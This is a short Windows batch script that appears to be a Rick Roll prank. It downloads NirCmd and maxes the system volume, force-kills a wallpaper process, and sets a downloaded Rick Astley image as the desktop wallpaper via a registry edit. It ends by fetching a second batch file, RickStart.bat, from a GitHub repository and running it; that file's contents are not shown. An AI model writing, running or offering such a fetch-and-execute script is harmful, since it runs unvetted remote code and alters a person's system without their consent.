curl https://www.nirsoft.net/utils/nircmd-x64.zip -O
powershell Expand-Archive -Force nircmd-x64.zip C:\Users\%username%\Downloads\

C:\Users\%username%\Downloads\nircmd.exe setsysvolume 65535

taskkill /F /IM "wallpaper32.exe" /T
curl https://raw.githubusercontent.com/WalaBalla/Rick-Roll-test/main/maxresdefault.bmp -O maxresdefault.bmp
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d maxresdefault.bmp /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters

curl https://raw.githubusercontent.com/WalaBalla/Rick-Roll-test/main/RickStart.bat -O RickStart.bat
start RickStart.bat